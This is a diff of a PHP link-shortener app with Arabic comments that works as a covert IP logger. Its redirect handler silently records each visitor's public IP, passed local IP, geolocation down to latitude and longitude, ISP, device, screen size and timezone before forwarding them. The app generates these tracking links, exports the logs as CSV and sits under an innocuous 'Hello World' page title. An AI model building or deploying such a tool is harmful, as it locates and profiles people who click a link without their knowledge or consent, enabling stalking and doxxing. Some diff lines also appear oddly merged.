@@ -91,6 +91,99 @@ if (isset($_GET['r'])) {
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {
-        $target =$link['target_url'];
-        $public_ip = get_real_ip();$local_
+    if ($link) {$target = $link['target_url'];$public_ip = get_real_ip();
+        $local_ip =$_GET['lip'] ?? 'غير متوفر';
+        $geo = get_ip_details($public_ip);
+        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        $device = get_device_type($ua);
+        $screen =$_GET['screen'] ?? 'غير متوفر';
+        $tz =$_GET['tz'] ?? 'غير متوفر';
+
+        try {
+            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+            $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
+        } catch (Exception $e) {
+            // تخطي أخطاء السجل لضمان التوجيه
+        }
+
+        header("Location: " . $target);
+        exit();
+    } else {
+        die("الرابط غير موجود.");
+    }
+}
+
+// 2. إنشاء رابط جديد
+$generated_link = "";
+$tracking_code = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
+    $target_url = trim($_POST['target_url']);
+    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
+        $target_url = "https://" . $target_url;
+    }
+
+    $code = substr(md5(uniqid(rand(), true)), 0, 7);
+    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
+    $stmt->execute([$code,$target_url]);
+
+    $tracking_code =$code;
+    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
+}
+
+$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
+$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
+
+$filter_code = trim($_GET['track'] ?? '');
+
+// 3. تصدير البيانات إلى ملف CSV
+if (isset($_GET['export']) && $_GET['export'] == 'true') {$filename = !empty($filter_code) ? "report_{$filter_code}.csv" : "all_logs_report.csv";
+    header('Content-Type: text/csv; charset=utf-8');
+    header('Content-Disposition: attachment; filename="' . $filename . '"');
+    
+    $output = fopen('php://output', 'w');
+    fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF));
+    
+    fputcsv($output, ['ID', 'Code', 'Public IP', 'Local IP', 'Country', 'City', 'Latitude', 'Longitude', 'ISP', 'Device Info', 'Screen Resolution', 'Timezone', 'Created At']);
+
+    if (!empty($filter_code)) {
+        $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
+        $stmt->execute([$filter_code]);
+        $export_logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
+    } else {
+        $export_logs =$db->query("SELECT * FROM logs ORDER BY id DESC")->fetchAll(PDO::FETCH_ASSOC);
+    }
+
+    foreach ($export_logs as$row) {
+        fputcsv($output, [$row['id'], 
+            $row['code'],$row['public_ip'], 
+            $row['local_ip'],$row['country'], 
+            $row['city'],$row['lat'], 
+            $row['lon'],$row['isp'], 
+            $row['device_info'],$row['screen_res'], 
+            $row['timezone'],$row['created_at']
+        ]);
+    }
+    fclose($output);
+    exit();
+}
+
+if (!empty($filter_code)) {
+    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
+}
+?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello World from azez</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+        body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
+        .container { max-width: 1050px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
+        .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10
